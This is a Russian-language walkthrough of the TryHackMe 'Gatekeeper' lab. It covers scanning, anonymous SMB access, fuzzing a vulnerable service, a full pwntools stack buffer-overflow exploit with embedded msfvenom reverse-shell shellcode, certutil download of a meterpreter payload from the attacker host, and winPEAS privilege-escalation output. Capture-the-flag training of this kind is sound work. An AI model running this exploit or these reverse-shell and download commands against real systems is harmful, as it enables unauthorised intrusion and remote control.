# TryHackMe - Win Medium - Gatekeeper

📅 Дата: 2025-07-24  
🧠 Сложность: Medium  
💻 IP-адрес: 10.10.192.2  

---

## Sugar

```bash
nmap_ctf() {
  local ip=$1
  sudo nmap -sS -p- -Pn --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
}
```


## 🔍 Сканирование

```bash
export ip=10.10.192.2 && nmap_ctf $ip
```

### nmap
```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: GATEKEEPER
|   NetBIOS_Domain_Name: GATEKEEPER
|   NetBIOS_Computer_Name: GATEKEEPER
|   DNS_Domain_Name: gatekeeper
|   DNS_Computer_Name: gatekeeper
|   Product_Version: 6.1.7601
|_  System_Time: 2025-07-24T13:03:57+00:00
| ssl-cert: Subject: commonName=gatekeeper
| Issuer: commonName=gatekeeper
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2025-07-23T12:57:21
| Not valid after:  2026-01-22T12:57:21
| MD5:   bd26:6214:f501:6032:574a:f519:2155:e93e
|_SHA-1: 3146:d659:5e61:4796:0478:270e:b519:4d0d:829e:6d8f
31337/tcp open  Elite?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     Hello GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
|     Hello
|   GenericLines: 
|     Hello 
|     Hello
|   GetRequest: 
|     Hello GET / HTTP/1.0
|     Hello
|   HTTPOptions: 
|     Hello OPTIONS / HTTP/1.0
|     Hello
|   Help: 
|     Hello HELP
|   Kerberos: 
|     Hello !!!
|   LDAPSearchReq: 
|     Hello 0
|     Hello
|   LPDString: 
|     Hello 
|     default!!!
|   RTSPRequest: 
|     Hello OPTIONS / RTSP/1.0
|     Hello
|   SIPOptions: 
|     Hello OPTIONS sip:nm SIP/2.0
|     Hello Via: SIP/2.0/TCP nm;branch=foo
|     Hello From: <sip:nm@nm>;tag=root
|     Hello To: <sip:nm2@nm2>
|     Hello Call-ID: 50000
|     Hello CSeq: 42 OPTIONS
|     Hello Max-Forwards: 70
|     Hello Content-Length: 0
|     Hello Contact: <sip:nm@nm>
|     Hello Accept: application/sdp
|     Hello
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    Hello
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49163/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.94SVN%I=7%D=7/24%Time=68822E9B%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,24,"Hello\x20GET\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n"
SF:)%r(SIPOptions,142,"Hello\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r!!!\nHello\
SF:x20Via:\x20SIP/2\.0/TCP\x20nm;branch=foo\r!!!\nHello\x20From:\x20<sip:n
SF:m@nm>;tag=root\r!!!\nHello\x20To:\x20<sip:nm2@nm2>\r!!!\nHello\x20Call-
SF:ID:\x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-F
SF:orwards:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Conta
SF:ct:\x20<sip:nm@nm>\r!!!\nHello\x20Accept:\x20application/sdp\r!!!\nHell
SF:o\x20\r!!!\n")%r(GenericLines,16,"Hello\x20\r!!!\nHello\x20\r!!!\n")%r(
SF:HTTPOptions,28,"Hello\x20OPTIONS\x20/\x20HTTP/1\.0\r!!!\nHello\x20\r!!!
SF:\n")%r(RTSPRequest,28,"Hello\x20OPTIONS\x20/\x20RTSP/1\.0\r!!!\nHello\x
SF:20\r!!!\n")%r(Help,F,"Hello\x20HELP\r!!!\n")%r(SSLSessionReq,C,"Hello\x
SF:20\x16\x03!!!\n")%r(TerminalServerCookie,B,"Hello\x20\x03!!!\n")%r(TLSS
SF:essionReq,C,"Hello\x20\x16\x03!!!\n")%r(Kerberos,A,"Hello\x20!!!\n")%r(
SF:FourOhFourRequest,47,"Hello\x20GET\x20/nice%20ports%2C/Tri%6Eity\.txt%2
SF:ebak\x20HTTP/1\.0\r!!!\nHello\x20\r!!!\n")%r(LPDString,12,"Hello\x20\x0
SF:1default!!!\n")%r(LDAPSearchReq,17,"Hello\x200\x84!!!\nHello\x20\x01!!!
SF:\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.007 days (since Thu Jul 24 08:55:11 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-24T13:03:58
|_  start_date: 2025-07-24T12:57:00
| nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:3c:a4:01:a4:89 (unknown)
| Names:
|   GATEKEEPER<00>       Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   GATEKEEPER<20>       Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-24T09:03:58-04:00
|_clock-skew: mean: 1h00m01s, deviation: 2h00m01s, median: 0s
```


---

## 🕵️ Enumeration

### SMB

Проверяю возможность подключения без пароля
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/scans]
└─$ smbclient -L $ip -U ""       
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.192.2 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Подключаюсь к `Users` и скачиваю все файлы
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/scans]
└─$ smbclient \\\\$ip\\Users -U ""
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3878938 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

В директории `Share` был файл `gatekeeper.exe`, получаю информацию
```bash
┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Medium - Gatekeeper/exploits/Share]
└─$ file gatekeeper.exe 
gatekeeper.exe: PE32 executable for MS Windows 6.00 (console), Intel i386, 5 sections
                                                                                                                  
┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Medium - Gatekeeper/exploits/Share]
└─$ rabin2 -I gatekeeper.exe 
arch     x86
baddr    0x8040000
binsz    13312
bintype  pe
bits     32
canary   true
injprot  false
retguard false
class    PE32
cmp.csum 0x00006e39
compiled Sat Feb 13 00:54:04 2016
crypto   false
dbg_file \\VBOXSVR\dostackbufferoverflowgood\dostackbufferoverflowgood\Release\dostackbufferoverflowgood.pdb
endian   little
havecode true
hdr.csum 0x00000000
guid     84F6466562BD487F8B7F598C6817A6EBE
laddr    0x0
lang     c
linenum  false
lsyms    false
machine  i386
nx       false
os       windows
overlay  false
cc       cdecl
pic      false
relocs   true
signed   false
sanitize false
static   false
stripped false
subsys   Windows CUI
va       true
```

- `arch     x86`
- `nx       false`
  - стек и куча исполняемые
- `canary   true`
  - убью при перезаписи EIP
- `stripped false`
  - возможно стоит смотреть в ghidra

- `ASLR (Address Space Layout Randomization)`
  - `pic      false` — код не является позиционно-независимым (Position Independent Code).
  - `relocs   true`  — присутствуют записи перемещения (relocation records).  
Для исполняемого файла (exe) это означает, что `ASLR` может быть поддержан, если операционная система включает эту функцию.  
Исполняемые файлы могут быть загружены по случайному адресу, даже если они не являются `PIC`, при наличии записей перемещения.
Но, скорее всего, т.к. указана совместимость с `MS Windows 6.00`, адреса будут постоянными и загружаться по `baddr    0x8040000`


Сходу запустить на `Windows` машине не получилось  
<img width="1916" height="1016" alt="image" src="https://github.com/user-attachments/assets/a4ff2ae9-9385-4ef0-8d72-2eedea0b3735" />  

Загружаю `vc_redist.x86.exe` с  
`https://www.microsoft.com/ru-ru/download/details.aspx?id=53840`

И теперь всё работает  
```bash
┌──(kali㉿0x2d-pentest)-[~/…/TryHackMe/Win Medium - Gatekeeper/exploits/Share]
└─$ nc 192.168.56.124 31337
--pentest
Hello --pentest!!!
```
<img width="673" height="340" alt="image" src="https://github.com/user-attachments/assets/6bc2dc5d-ddbd-46b9-8e3a-38fcfd9bfb77" />  

Запускаю `gatekeeper.exe` в `immunity debugger` и устанавливаю рабочую директорию  
```python
!mona config -set workingfolder c:\mona\%p
```
<img width="1917" height="1016" alt="image" src="https://github.com/user-attachments/assets/a9c271ec-db53-4427-ace5-0c5f47e295d7" />  

Создаю шаблон для проверки на переполение буфера
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ pwn template ./Share/gatekeeper.exe --quiet --host 192.168.56.124 --port 31337 > x.py
[*] Automatically detecting challenge binaries...
```

Корректирую шаблон и запускаю фаззер
```python
rom pwn import *

context.update(arch='i386')
exe = './Share/gatekeeper.exe'

host = args.HOST or '192.168.56.124'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# ==================== LOCAL  CONSTANTS =====================
RESPONSE_TIMEOUT = 2
# ==================== OPTIMIZED FUZZER =====================
def run_fuzzer():
    io = start()

    pattern = cyclic(5000)  # Generate smart pattern
    chunk_size = 100
    max_size = 5000

    for i in range(0, max_size, chunk_size):
        try:
            current_payload = pattern[:i]
            log.info(f"Sending {len(current_payload)} bytes")

            io.sendline(current_payload)
            response = io.recv(timeout=RESPONSE_TIMEOUT)

            if not response:
                log.success(f"Server stopped responding at [{i}] bytes")
                break

            if b'Hello' not in response:
                log.success(f"Unexpected response at [{i}] bytes")
                break

        except EOFError:
            log.success(f"Server crashed at ~[{i}] bytes")
            break
        except Exception as e:
            log.warning(f"Error at [{i}] bytes: {str(e)}")
            break

    # Try to interact if crash detected
    try:
        io.close()
    except:
        pass

# ==================== MAIN =====================
if __name__ == '__main__':
    run_fuzzer()
```

Приложение упало при отправке 200 байт
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ python3 x.py
[+] Opening connection to 192.168.56.124 on port 31337: Done
[*] Sending 0 bytes
[*] Sending 100 bytes
[*] Sending 200 bytes
[+] Server stopped responding at [200] bytes
[*] Closed connection to 192.168.56.124 port 31337
```

И сразу смотрю адреса регистров, т.к. они не изменятся в дальнейшем  
<img width="1919" height="1015" alt="image" src="https://github.com/user-attachments/assets/0e70fc35-713b-4c2d-b4fa-272fc6b8d3e1" />  

В функции `get_offset()` указываю значение `EIP` и запускаю скрипт снова  
```python
def get_offset():
    eip_value = 0x616D6261
    offset = cyclic_find(p32(eip_value))
    log.success(f"Offset [{offset}] bytes")

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    get_offset()
```

Offset [146] bytes
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ python3 x.py
[+] Offset [146] bytes
```

Теперь нужно убедиться, что я контролирую `EIP` и `stack`  
Корректирую в скрипте функцию `run_exploit()`  
Если правильно всё рассчитал, то должен получить `42424242` в `EIP` и 3 строки символов `C` в стеке
```python
def run_exploit():
    offset = 146
    junk   = b'A' * offset
    EIP    = b'B' * 4
    stack  = b'C' * 12

    #exclude_list = ['\\x00']
    #stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)

    payload = b''.join([
        junk,
        EIP,
        stack,
    ])

    try:
        io = start()
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    #get_offset()
    run_exploit()
```

Всё отлично!  
<img width="1920" height="996" alt="image" src="https://github.com/user-attachments/assets/543750ee-cda8-44c1-af75-7f733ca92167" />  

Приступаю к нахождению бэдчаров.  

Генерирую в `immunity debugger` последовательность без нулевого байта  
```python
!mona bytearray -b "\x00"
```

Корректирую функцию в скрипте
```python
def run_exploit():
    offset = 146
    junk   = b'A' * offset
    EIP    = b'B' * 4

    exclude_list = ['\\x00']
    stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)

    payload = b''.join([
        junk,
        EIP,
        stack.encode('latin-1'),
    ])

    try:
        io = start()
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    #get_offset()
    run_exploit()
```

Кроме `\x00` бэдчаров нет.  
```python
!mona compare -f "c:\mona\gatekeeper\bytearray.bin" -a 01CF19F8
```
<img width="1268" height="598" alt="image" src="https://github.com/user-attachments/assets/c9aee86a-8cfd-49da-b568-69edfc2e6617" />  

### ROPgadget

Далее нужно найти функцию для вызова кода из стека, для этого использую `ROPgadget`  
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ ROPgadget --binary ./Share/gatekeeper.exe > gatekeeper.allgadgets.txt
                                                                                                                  
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ grep -iE "call esp" gatekeeper.allgadgets.txt | awk -F';' 'NF <= 2'
                                                                                                                  
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ grep -iE "jmp esp" gatekeeper.allgadgets.txt | awk -F';' 'NF <= 2'
0x080414be : adc eax, 0xb8000002 ; jmp esp
0x080414c3 : jmp esp
0x080414bd : test byte ptr [0xb8000002], dl ; jmp esp
```

Теперь EIP в скрипте можно заменить на `EIP = 0x080414c3`  
  



## 📂 Получение доступа

Следующий шаг: создание полезной нагрузки.  
Буду использовать `windows/shell_reverse_tcp` и сразу укажу свой `ip` в сети `thm`  
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.21.104.16 LPORT=4444 -f py -b '\x00' -v stack
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1807 bytes
stack =  b""
stack += b"\xbb\x42\xcb\xf8\x39\xda\xc5\xd9\x74\x24\xf4\x58"
stack += b"\x29\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x82"
stack += b"\xcf\x1a\xcc\xfe\x38\x58\x2f\xfe\xb8\x3d\xb9\x1b"
stack += b"\x89\x7d\xdd\x68\xba\x4d\x95\x3c\x37\x25\xfb\xd4"
stack += b"\xcc\x4b\xd4\xdb\x65\xe1\x02\xd2\x76\x5a\x76\x75"
stack += b"\xf5\xa1\xab\x55\xc4\x69\xbe\x94\x01\x97\x33\xc4"
stack += b"\xda\xd3\xe6\xf8\x6f\xa9\x3a\x73\x23\x3f\x3b\x60"
stack += b"\xf4\x3e\x6a\x37\x8e\x18\xac\xb6\x43\x11\xe5\xa0"
stack += b"\x80\x1c\xbf\x5b\x72\xea\x3e\x8d\x4a\x13\xec\xf0"
stack += b"\x62\xe6\xec\x35\x44\x19\x9b\x4f\xb6\xa4\x9c\x94"
stack += b"\xc4\x72\x28\x0e\x6e\xf0\x8a\xea\x8e\xd5\x4d\x79"
stack += b"\x9c\x92\x1a\x25\x81\x25\xce\x5e\xbd\xae\xf1\xb0"
stack += b"\x37\xf4\xd5\x14\x13\xae\x74\x0d\xf9\x01\x88\x4d"
stack += b"\xa2\xfe\x2c\x06\x4f\xea\x5c\x45\x18\xdf\x6c\x75"
stack += b"\xd8\x77\xe6\x06\xea\xd8\x5c\x80\x46\x90\x7a\x57"
stack += b"\xa8\x8b\x3b\xc7\x57\x34\x3c\xce\x93\x60\x6c\x78"
stack += b"\x35\x09\xe7\x78\xba\xdc\xa8\x28\x14\x8f\x08\x98"
stack += b"\xd4\x7f\xe1\xf2\xda\xa0\x11\xfd\x30\xc9\xb8\x04"
stack += b"\xd3\xfc\x29\x6e\x33\x69\x50\x6e\x22\x35\xdd\x88"
stack += b"\x2e\xd5\x8b\x03\xc7\x4c\x96\xdf\x76\x90\x0c\x9a"
stack += b"\xb9\x1a\xa3\x5b\x77\xeb\xce\x4f\xe0\x1b\x85\x2d"
stack += b"\xa7\x24\x33\x59\x2b\xb6\xd8\x99\x22\xab\x76\xce"
stack += b"\x63\x1d\x8f\x9a\x99\x04\x39\xb8\x63\xd0\x02\x78"
stack += b"\xb8\x21\x8c\x81\x4d\x1d\xaa\x91\x8b\x9e\xf6\xc5"
stack += b"\x43\xc9\xa0\xb3\x25\xa3\x02\x6d\xfc\x18\xcd\xf9"
stack += b"\x79\x53\xce\x7f\x86\xbe\xb8\x9f\x37\x17\xfd\xa0"
stack += b"\xf8\xff\x09\xd9\xe4\x9f\xf6\x30\xad\x90\xbc\x18"
stack += b"\x84\x38\x19\xc9\x94\x24\x9a\x24\xda\x50\x19\xcc"
stack += b"\xa3\xa6\x01\xa5\xa6\xe3\x85\x56\xdb\x7c\x60\x58"
stack += b"\x48\x7c\xa1"
```  

  
Корректирую скрипт  
```python
def run_exploit():
    offset = 146
    junk   = b'A' * offset
    EIP    = 0x080414c3
    nop    = '\x90' * 16

    #exclude_list = ['\\x00']
    #stack = ''.join(f'\\x{x:02x}' for x in range(1, 256) if f'\\x{x:02x}' not in exclude_list)

    stack = b""
    stack += b"\xbb\x42\xcb\xf8\x39\xda\xc5\xd9\x74\x24\xf4\x58"
    stack += b"\x29\xc9\xb1\x52\x31\x58\x12\x03\x58\x12\x83\x82"
    stack += b"\xcf\x1a\xcc\xfe\x38\x58\x2f\xfe\xb8\x3d\xb9\x1b"
    stack += b"\x89\x7d\xdd\x68\xba\x4d\x95\x3c\x37\x25\xfb\xd4"
    stack += b"\xcc\x4b\xd4\xdb\x65\xe1\x02\xd2\x76\x5a\x76\x75"
    stack += b"\xf5\xa1\xab\x55\xc4\x69\xbe\x94\x01\x97\x33\xc4"
    stack += b"\xda\xd3\xe6\xf8\x6f\xa9\x3a\x73\x23\x3f\x3b\x60"
    stack += b"\xf4\x3e\x6a\x37\x8e\x18\xac\xb6\x43\x11\xe5\xa0"
    stack += b"\x80\x1c\xbf\x5b\x72\xea\x3e\x8d\x4a\x13\xec\xf0"
    stack += b"\x62\xe6\xec\x35\x44\x19\x9b\x4f\xb6\xa4\x9c\x94"
    stack += b"\xc4\x72\x28\x0e\x6e\xf0\x8a\xea\x8e\xd5\x4d\x79"
    stack += b"\x9c\x92\x1a\x25\x81\x25\xce\x5e\xbd\xae\xf1\xb0"
    stack += b"\x37\xf4\xd5\x14\x13\xae\x74\x0d\xf9\x01\x88\x4d"
    stack += b"\xa2\xfe\x2c\x06\x4f\xea\x5c\x45\x18\xdf\x6c\x75"
    stack += b"\xd8\x77\xe6\x06\xea\xd8\x5c\x80\x46\x90\x7a\x57"
    stack += b"\xa8\x8b\x3b\xc7\x57\x34\x3c\xce\x93\x60\x6c\x78"
    stack += b"\x35\x09\xe7\x78\xba\xdc\xa8\x28\x14\x8f\x08\x98"
    stack += b"\xd4\x7f\xe1\xf2\xda\xa0\x11\xfd\x30\xc9\xb8\x04"
    stack += b"\xd3\xfc\x29\x6e\x33\x69\x50\x6e\x22\x35\xdd\x88"
    stack += b"\x2e\xd5\x8b\x03\xc7\x4c\x96\xdf\x76\x90\x0c\x9a"
    stack += b"\xb9\x1a\xa3\x5b\x77\xeb\xce\x4f\xe0\x1b\x85\x2d"
    stack += b"\xa7\x24\x33\x59\x2b\xb6\xd8\x99\x22\xab\x76\xce"
    stack += b"\x63\x1d\x8f\x9a\x99\x04\x39\xb8\x63\xd0\x02\x78"
    stack += b"\xb8\x21\x8c\x81\x4d\x1d\xaa\x91\x8b\x9e\xf6\xc5"
    stack += b"\x43\xc9\xa0\xb3\x25\xa3\x02\x6d\xfc\x18\xcd\xf9"
    stack += b"\x79\x53\xce\x7f\x86\xbe\xb8\x9f\x37\x17\xfd\xa0"
    stack += b"\xf8\xff\x09\xd9\xe4\x9f\xf6\x30\xad\x90\xbc\x18"
    stack += b"\x84\x38\x19\xc9\x94\x24\x9a\x24\xda\x50\x19\xcc"
    stack += b"\xa3\xa6\x01\xa5\xa6\xe3\x85\x56\xdb\x7c\x60\x58"
    stack += b"\x48\x7c\xa1"

    payload = b''.join([
        junk,
        p32(EIP),
        nop,
        stack,
    ])

    try:
        io = start()
        io.sendline(payload)
        try:
            response = io.recv(timeout=RESPONSE_TIMEOUT)
            if response:
                log.warning(f"Server responded unexpectedly: {response[:100]}...")
            else:
                log.success("Server stopped responding - likely crashed!")
        except EOFError:
            log.success("Connection closed by server - likely crashed!")

    except Exception as e:
        log.error(f"Error during exploitation: {str(e)}")
    finally:
        try:
            io.close()
        except:
            pass

# ==================== MAIN =====================
if __name__ == '__main__':
    #run_fuzzer()
    #get_offset()
    run_exploit()
```

Указываю скрипту хост машины `thm`
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ python3 x.py HOST=$ip                                                                       
[+] Opening connection to 10.10.192.2 on port 31337: Done
[+] Server stopped responding - likely crashed!
[*] Closed connection to 10.10.192.2 port 31337
```

И получаю шелл от `natbat`  
```bash
┌──(kali㉿0x2d-pentest)-[~]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...
connect to [10.21.104.16] from (UNKNOWN) [10.10.192.2] 49195
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>whoami
whoami
gatekeeper\natbat

C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,878,819,840 bytes free

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
C:\Users\natbat\Desktop>
```

## ⚙️ Привилегии

Генерирую оболочку `meterpreter`, запускаю сервер
```bash
┌──(.venv)─(kali㉿0x2d-pentest)-[~/Labs/TryHackMe/Win Medium - Gatekeeper/exploits]
└─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.21.104.16 LPORT=5555 -f exe -o meter-5555.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: meter-5555.exe
```

Запускаю `multi/handler`
```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.21.104.16:5555
```

Загружаю на жертву `meter-5555.exe`
```ps
C:\Users\natbat\Downloads>certutil -urlcache -f http://10.21.104.16:8888/meter-5555.exe meter-5555.exe
certutil -urlcache -f http://10.21.104.16:8888/meter-5555.exe meter-5555.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\natbat\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Downloads

07/24/2025  11:38 AM    <DIR>          .
07/24/2025  11:38 AM    <DIR>          ..
07/24/2025  11:38 AM            73,802 meter-5555.exe
               1 File(s)         73,802 bytes
               2 Dir(s)  15,754,280,960 bytes free

C:\Users\natbat\Downloads>
```

Получаю оболочку `meterpreter`
```bash
meterpreter > sysinfo
Computer        : GATEKEEPER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

Загрузил `winpeas`
```ps
certutil -urlcache -f http://10.21.104.16:8888/winPEAS.bat winpeas.bat
```

Рекомендуемые эксплоиты
```ps
"Microsoft Windows 7 Professional   "                                                                              
   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                  
MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                            
MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                         
MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                      
MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                        
MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                     
MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                          
MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                        
MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                     
MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                           
MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                            
MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                             
MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                              
